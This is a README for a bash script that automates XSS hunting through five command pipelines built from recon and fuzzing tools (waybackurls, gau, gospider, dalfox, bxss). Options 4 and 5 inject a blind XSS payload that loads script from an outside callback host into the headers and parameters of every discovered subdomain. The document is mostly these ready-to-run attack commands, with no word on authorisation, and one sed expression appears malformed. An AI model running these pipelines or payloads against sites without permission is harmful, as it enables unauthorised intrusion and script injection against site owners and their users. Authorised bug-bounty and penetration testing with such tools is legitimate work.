# xss-automate-five-in-one
Useful script with five different methods to detect XSS

### Summary for the Script

This script automates various methods of detecting cross-site scripting (XSS) vulnerabilities using different tools. It allows the user to choose an XSS detection technique, provides details on the commands that will be executed, and runs the corresponding method based on the user's input.

---

### How to Use the Script

1. **Run the Script**: Save the script to a file (e.g., `xss_detect.sh`) and make it executable using:
   ```bash
   chmod +x xss_detect.sh
   ./xss_detect.sh
   ```

2. **Choose an Option**: The script will display five XSS detection options. Select one by entering the corresponding number.

3. **Provide Inputs**: Depending on the chosen option, the script will prompt for inputs such as:
   - Domain name (e.g., `example.com`).
   - A file containing URLs (for some methods).
   - A Blind XSS listener domain (if required).

4. **View Results**: The script will execute the selected command and save the results in output files for further analysis.

---

### Prerequisite Tools

Ensure the following tools are installed on your system before running the script:

1. **Option 1**:
   - `waybackurls`
   - `gf`
   - `dalfox`

2. **Option 2**:
   - `gospider`
   - `qsreplace`
   - `dalfox`

3. **Option 3**:
   - `gau`
   - `gf`
   - `uro`
   - `Gxss`
   - `kxss`

4. **Option 4 & 5**:
   - `subfinder`
   - `gau`
   - `bxss`

Install these tools using package managers like `apt`, `brew`, or `go`, as appropriate.

---

### Example Commands for Each Option

#### **Option 1: XSS using `waybackurls`, `gf`, and `dalfox`**
```bash
waybackurls domain.com | gf xss | sed 's/=.*=/' | sort -u | tee file.txt && cat file.txt | dalfox pipe -b YOURS.xss.ht > xss_Results_wayback.txt
```

#### **Option 2: XSS using `gospider`, `qsreplace`, and `dalfox`**
```bash
gospider -S urls.txt -c 10 -d 5 --blacklist ".*(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' | grep "=" | qsreplace "a" | dalfox pipe -b YOURS.xss.ht | tee -a xss_out.txt
```

#### **Option 3: XSS using `gau`, `gf`, `uro`, `Gxss`, and `kxss`**
```bash
echo domain.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt && cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*=/=/' | sort -u > final.txt
```

#### **Option 4: Header-Based Blind XSS using `bxss`**
```bash
subfinder domain.com | gau | bxss -payload '"><script src=https://YOURS.xss.ht></script>' -header "X-Forwarded-For"
```

#### **Option 5: Blind XSS in Parameters using `bxss`**
```bash
subfinder domain.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://YOURS.xss.ht></script>' -parameters
```

---

This script simplifies the workflow for XSS detection, consolidating various methods into an interactive and user-friendly experience.
